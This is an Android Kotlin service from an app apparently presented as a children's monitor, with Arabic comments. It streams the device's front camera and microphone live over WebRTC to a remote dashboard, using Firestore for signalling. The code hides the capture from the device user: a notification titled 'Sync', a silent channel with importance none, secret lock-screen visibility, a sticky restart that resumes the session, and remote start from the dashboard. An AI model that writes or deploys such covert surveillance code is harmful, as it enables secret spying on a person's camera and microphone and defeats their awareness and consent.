package com.kids.monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.AudioManager
import android.os.Build
import android.os.IBinder
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions
import com.kids.monitor.data.FirestoreSync
import org.webrtc.AudioSource
import org.webrtc.Camera2Enumerator
import org.webrtc.DataChannel
import org.webrtc.DefaultVideoDecoderFactory
import org.webrtc.DefaultVideoEncoderFactory
import org.webrtc.EglBase
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.MediaStream
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpReceiver
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.SurfaceTextureHelper
import org.webrtc.VideoCapturer
import org.webrtc.VideoSource

/**
 * بث مباشر حقيقي (WebRTC) من كاميرا وميكروفون الجهاز إلى لوحة التحكم.
 *
 * التنبيه: الاتصال يتم عبر وثيقة live/rtc:
 *  - اللوحة تكتب: request=true + session + parentCandidates (ICE).
 *  - الجهاز يكتب: offer + childCandidates (ICE).
 *  - اللوحة تكتب: answer.
 * لا نحتاج سيرفر خاص: Firestore إشارات + STUN عام + TURN مجاني (openrelay) كبديل.
 */
class WebRtcService : Service() {

    private var eglBase: EglBase? = null
    private var factory: PeerConnectionFactory? = null
    private var pc: PeerConnection? = null
    private var videoCapturer: VideoCapturer? = null
    private var surfaceHelper: SurfaceTextureHelper? = null
    private var videoSource: VideoSource? = null
    private var audioSource: AudioSource? = null
    private var localStream: MediaStream? = null
    private var listener: ListenerRegistration? = null

    @Volatile
    private var session: String = ""
    private var parentSeen = 0
    private var remoteSet = false
    private var started = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        FirestoreSync.init(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        val fromIntent = intent?.getStringExtra(EXTRA_SESSION).orEmpty()
        // START_STICKY يعيد التشغيل بدون Intent: نستأنف آخر جلسة بدل إيقاف البث.
        val sess = if (fromIntent.isNotBlank()) fromIntent else
            getSharedPreferences("monitor_prefs", MODE_PRIVATE)
                .getString("rtc_session", "").orEmpty()
        if (sess.isBlank()) {
            stopSelf()
            return START_NOT_STICKY
        }
        getSharedPreferences("monitor_prefs", MODE_PRIVATE)
            .edit().putString("rtc_session", sess).apply()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    buildNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE,
                )
            } else {
                startForeground(NOTIFICATION_ID, buildNotification())
            }
        } catch (e: Exception) {
            stopSelf()
            return START_NOT_STICKY
        }
        val previous = session
        session = sess
        if (started) {
            if (sess == previous) return START_STICKY
            release()
        }
        session = sess
        started = true
        Thread {
            try {
                setup(sess)
            } catch (e: Exception) {
                FirestoreSync.setLive(
                    this, "rtc",
                    mapOf(
                        "status" to "error",
                        "session" to sess,
                        "error" to (e.localizedMessage ?: "فشل بدء WebRTC"),
                        "timestamp" to System.currentTimeMillis(),
                    ),
                )
                stopSelf()
            }
        }.start()
        return START_STICKY
    }

    override fun onDestroy() {
        instance = null
        release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ---------- إنشاء الاتصال ----------

    private fun setup(sess: String) {
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(applicationContext)
                .createInitializationOptions(),
        )
        val egl = EglBase.create()
        eglBase = egl
        val encoder = DefaultVideoEncoderFactory(egl.eglBaseContext, true, true)
        val decoder = DefaultVideoDecoderFactory(egl.eglBaseContext)
        val f = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoder)
            .setVideoDecoderFactory(decoder)
            .createPeerConnectionFactory()
        factory = f

        val aSource = f.createAudioSource(MediaConstraints())
        audioSource = aSource
        val audioTrack = f.createAudioTrack("kids-audio", aSource)

        val capturer = createCameraCapturer() ?: throw IllegalStateException("لا توجد كاميرا متاحة")
        videoCapturer = capturer
        val vSource = f.createVideoSource(false)
        videoSource = vSource
        val helper = SurfaceTextureHelper.create("rtc-capture", egl.eglBaseContext)
        surfaceHelper = helper
        capturer.initialize(helper, applicationContext, vSource.capturerObserver)
        capturer.startCapture(640, 480, 24)
        val videoTrack = f.createVideoTrack("kids-video", vSource)

        val stream = f.createLocalMediaStream("kids-stream")
        localStream = stream
        stream.addTrack(audioTrack)
        stream.addTrack(videoTrack)

        val servers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("turn:openrelay.metered.ca:80")
                .setUsername("openrelayproject").setPassword("openrelayproject").createIceServer(),
            PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443")
                .setUsername("openrelayproject").setPassword("openrelayproject").createIceServer(),
        )
        val config = PeerConnection.RTCConfiguration(servers)
        config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN

        val conn = f.createPeerConnection(config, observer)
            ?: throw IllegalStateException("تعذر إنشاء اتصال WebRTC")
        pc = conn
        conn.addTrack(audioTrack, listOf(stream.id))
        conn.addTrack(videoTrack, listOf(stream.id))

        setSpeaker(true)
        listenSignal(sess)

        conn.createOffer(object : SdpAdapter() {
            override fun onCreateSuccess(sdp: SessionDescription?) {
                if (sdp == null) return
                // نكتب العرض ونصفّر مرشّحي الجلسة السابقة قبل بدء التجميع
                // حتى لا يضيع أول مرشّح (arrayUnion بعد الكتابة).
                val ref = FirestoreSync.liveDoc(this@WebRtcService, "rtc")
                if (ref != null) {
                    try {
                        ref.set(
                            mapOf(
                                "session" to sess,
                                "request" to true,
                                "status" to "offered",
                                "offer" to mapOf("type" to "offer", "sdp" to sdp.description, "s" to sess),
                                "childCandidates" to emptyList<Any>(),
                                "updatedAt" to System.currentTimeMillis(),
                            ),
                            SetOptions.merge(),
                        )
                    } catch (e: Exception) { /* تجاهل */ }
                }
                conn.setLocalDescription(SdpAdapter(), sdp)
            }
        }, MediaConstraints())
    }

    private fun createCameraCapturer(): VideoCapturer? {
        return try {
            val enumerator = Camera2Enumerator(this)
            val names = enumerator.deviceNames
            val front = names.firstOrNull { enumerator.isFrontFacing(it) }
            val chosen = front ?: names.firstOrNull() ?: return null
            enumerator.createCapturer(chosen, null)
        } catch (e: Exception) {
            null
        }
    }

    // ---------- الإشارات ----------

    private fun listenSignal(sess: String) {
        val ref = FirestoreSync.liveDoc(this, "rtc") ?: return
        parentSeen = 0
        listener = ref.addSnapshotListener { snap, error ->
            if (error != null || snap == null || !snap.exists()) return@addSnapshotListener
            if (snap.getString("session") != sess) return@addSnapshotListener
            if (snap.getString("status") == "stopped") {
                stopSelf()
                return@addSnapshotListener
            }
            val conn = pc ?: return@addSnapshotListener
            if (!remoteSet) {
                val answer = snap.get("answer") as? Map<*, *>
                val sdpText = answer?.get("sdp") as? String
                val answerSession = answer?.get("s") as? String
                if (!sdpText.isNullOrBlank() && (answerSession == null || answerSession == sess)) {
                    remoteSet = true
                    try {
                        conn.setRemoteDescription(
                            SdpAdapter(),
                            SessionDescription(SessionDescription.Type.ANSWER, sdpText),
                        )
                    } catch (e: Exception) { /* تجاهل */ }
                }
            }
            @Suppress("UNCHECKED_CAST")
            val candidates = snap.get("parentCandidates") as? List<Map<String, Any>> ?: return@addSnapshotListener
            val fresh = candidates.filter { (it["s"] as? String) == sess }
            while (parentSeen < fresh.size) {
                val item = fresh[parentSeen]
                parentSeen++
                val text = item["candidate"] as? String ?: continue
                val mid = item["sdpMid"] as? String
                val index = (item["sdpMLineIndex"] as? Number)?.toInt() ?: 0
                try {
                    conn.addIceCandidate(IceCandidate(mid, index, text))
                } catch (e: Exception) { /* تجاهل */ }
            }
        }
    }

    private val observer = object : PeerConnection.Observer {
        override fun onSignalingChange(p0: PeerConnection.SignalingState?) {}
        override fun onIceConnectionChange(p0: PeerConnection.IceConnectionState?) {
            val sess = session
            if (sess.isNotBlank()) {
                FirestoreSync.setLive(
                    this@WebRtcService, "rtc",
                    mapOf(
                        "session" to sess,
                        "iceState" to (p0?.name ?: ""),
                        "updatedAt" to System.currentTimeMillis(),
                    ),
                )
            }
        }
        override fun onIceConnectionReceivingChange(p0: Boolean) {}
        override fun onIceGatheringChange(p0: PeerConnection.IceGatheringState?) {}
        override fun onIceCandidate(p0: IceCandidate?) {
            val cand = p0 ?: return
            val sess = session
            if (sess.isBlank()) return
            FirestoreSync.appendLiveArray(
                this@WebRtcService, "rtc", "childCandidates",
                mapOf(
                    "s" to sess,
                    "sdpMid" to cand.sdpMid,
                    "sdpMLineIndex" to cand.sdpMLineIndex,
                    "candidate" to cand.sdp,
                ),
            )
        }
        override fun onIceCandidatesRemoved(p0: Array<out IceCandidate>?) {}
        override fun onAddStream(p0: MediaStream?) {}
        override fun onRemoveStream(p0: MediaStream?) {}
        override fun onDataChannel(p0: DataChannel?) {}
        override fun onRenegotiationNeeded() {}
        override fun onAddTrack(p0: RtpReceiver?, p1: Array<out MediaStream>?) {}
    }

    private open class SdpAdapter : SdpObserver {
        override fun onCreateSuccess(p0: SessionDescription?) {}
        override fun onCreateFailure(p0: String?) {}
        override fun onSetSuccess() {}
        override fun onSetFailure(p0: String?) {}
    }

    // ---------- التنظيف ----------

    private fun release() {
        try { listener?.remove() } catch (e: Exception) { /* تجاهل */ }
        listener = null
        try { videoCapturer?.stopCapture() } catch (e: Exception) { /* تجاهل */ }
        try { videoCapturer?.dispose() } catch (e: Exception) { /* تجاهل */ }
        videoCapturer = null
        try { pc?.close() } catch (e: Exception) { /* تجاهل */ }
        try { pc?.dispose() } catch (e: Exception) { /* تجاهل */ }
        pc = null
        try { localStream?.dispose() } catch (e: Exception) { /* تجاهل */ }
        localStream = null
        try { audioSource?.dispose() } catch (e: Exception) { /* تجاهل */ }
        audioSource = null
        try { videoSource?.dispose() } catch (e: Exception) { /* تجاهل */ }
        videoSource = null
        try { surfaceHelper?.dispose() } catch (e: Exception) { /* تجاهل */ }
        surfaceHelper = null
        try { factory?.dispose() } catch (e: Exception) { /* تجاهل */ }
        factory = null
        try { eglBase?.release() } catch (e: Exception) { /* تجاهل */ }
        eglBase = null
        setSpeaker(false)
        remoteSet = false
        parentSeen = 0
        started = false
    }

    @Suppress("DEPRECATION")
    private fun setSpeaker(on: Boolean) {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
            am.isSpeakerphoneOn = on
        } catch (e: Exception) { /* تجاهل */ }
    }

    private fun buildNotification(): Notification {
        val openApp = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("المزامنة")
            .setContentText("بث مباشر")
            .setContentIntent(openApp)
            .setPriority(Notification.PRIORITY_MIN)
            .setSound(null)
            .setOngoing(true)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_NONE,
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    companion object {
        private const val EXTRA_SESSION = "session"
        private const val ACTION_STOP = "com.kids.monitor.STOP_RTC"
        private const val CHANNEL_ID = "rtc_stream_v1"
        private const val NOTIFICATION_ID = 1005

        @Volatile
        private var instance: WebRtcService? = null

        fun isRunning(): Boolean = instance != null

        fun start(context: Context, session: String) {
            val intent = Intent(context, WebRtcService::class.java).putExtra(EXTRA_SESSION, session)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                FirestoreSync.logError(context, "rtc", e.localizedMessage ?: "تعذر بدء البث المباشر")
            }
        }

        fun stop(context: Context) {
            try {
                context.stopService(Intent(context, WebRtcService::class.java))
            } catch (e: Exception) { /* تجاهل */ }
        }
    }
}
